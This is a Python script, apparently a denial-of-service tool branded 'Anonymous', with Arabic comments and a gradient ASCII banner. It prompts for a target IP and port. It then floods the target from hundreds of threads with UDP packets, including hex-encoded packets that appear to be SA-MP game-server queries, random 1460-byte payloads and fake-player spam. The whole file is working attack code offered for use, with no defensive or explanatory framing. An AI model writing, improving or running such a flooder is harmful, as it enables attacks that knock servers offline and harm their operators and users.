import random
import threading
import codecs
import time
import socket
import sys
import os

# تنظيف الشاشة
os.system("clear")

# تدرج لوني: بنفسجي إلى سماوي
gradient_colors = [165, 135, 99, 63, 69, 75, 81, 87, 123, 159, 195]

ascii_art = [
    "  ___",
    "   /   |  ____  ____  ____  ____ ___  ______ ___  ____  __  _______",
    "  / /| | / __ \\/ __ \\/ __ \\/ __ `/ / / / __ `__ \\/ __ \\/ / / / ___/",
    " / ___ |/ / / / /_/ / / / / /_/ / /_/ / / / / / / /_/ / /_/ (__  )",
    "/_/  |_|/_/ /_/\\____/_/ /_/\\__,_/\\__, /_/ /_/ /_/\\____/\\__,_/____/",
    "                               /____/",
    "   _________",
    "  / ____/__ \\",
    " / /    __/ /",
    "/ /___ / __/",
    "\\____//____/"
]

# طباعة الفن بتدرج لوني
def print_gradient_art(art_lines, colors):
    for i, line in enumerate(art_lines):
        color_code = colors[i % len(colors)]
        print(f"\033[38;5;{color_code}m{line}\033[0m")

print_gradient_art(ascii_art, gradient_colors)
print()

# إدخال البيانات
ip = str(input("Target Ip:"))
port = int(input("Target Port:"))
choice = str(input("Thb Tnik Serveur? (y/n):"))
times = int(input("Packet:"))
threads = int(input("Threads:"))
fake_ip = '182.21.20.32'

# إعداد الحزم
Pacotes = [
    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
    codecs.decode("53414d509538e1a9611e63", "hex_codec"),
    codecs.decode("53414d509538e1a9611e69", "hex_codec"),
    codecs.decode("53414d509538e1a9611e72", "hex_codec"),
    codecs.decode("081e62da", "hex_codec"),
    codecs.decode("081e77da", "hex_codec"),
    codecs.decode("081e4dda", "hex_codec"),
    codecs.decode("021efd40", "hex_codec"),
    codecs.decode("081e7eda", "hex_codec")
]

# دالة لزيادة عدد اللاعبين الوهميين
def fake_players():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            s.sendto(fake_ip.encode(), addr)
            print("[ANONYMOUS] Adding Fake Player!")
        except:
            print("[ANONYMOUS] Error adding Fake Player")

# دوال الهجمات المختلفة
def run():
    data = random._urandom(1460)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
        except:
            print("[ANONYMOUS] STRIKES BACK!")

# دالة لتشغيل الخيوط
class MyThread(threading.Thread):
    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Pacotes[random.randrange(0, 5)]
            sock.sendto(msg, (ip, int(port)))

if __name__ == '__main__':
    try:
        # بدء الخيوط الخاصة باللاعبين الوهميين إذا تم اختيارها
        fake_choice = input("هل تريد إضافة لاعبين وهميين؟ (y/n): ")
        if fake_choice.lower() == "y":
            for _ in range(threads):
                threading.Thread(target=fake_players).start()
        
        # بدء الهجمات بناءً على الخيارات المحددة
        for x in range(200):
            mythread = MyThread()
            mythread.start()
            time.sleep(0.1)

        for y in range(threads):
            if choice == 'y':
                threading.Thread(target=run).start()
            else:
                threading.Thread(target=run).start()
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
